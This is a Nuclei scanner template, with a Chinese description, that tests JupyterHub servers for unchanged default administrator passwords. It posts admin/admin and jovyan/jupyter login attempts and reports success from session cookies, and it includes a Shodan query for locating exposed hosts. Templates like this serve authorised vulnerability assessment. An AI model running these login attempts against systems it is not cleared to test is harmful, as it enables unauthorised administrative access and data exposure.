id: jupyterhub-default-login

info:
  name: Jupyterhub 默认管理员账户发现（弱口令）
  author: For3stCo1d
  severity: high
  description: 该模板通过尝试 Jupyterhub 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/jupyterhub/jupyterhub
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:jupyter:jupyterhub:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    shodan-query: http.title:"JupyterHub"
    product: jupyterhub
    vendor: jupyter
  tags: jupyterhub,default-login,vuln

http:
  - raw:
      - |
        POST /hub/login?next= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{user}}&password={{pass}}

    attack: pitchfork
    payloads:
      user:
        - admin
        - jovyan
      pass:
        - admin
        - jupyter

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - contains(tolower(header), 'jupyterhub-session-id=')
          - contains(tolower(header), 'jupyterhub-hub-login=')
        condition: and

      - type: status
        status:
          - 302
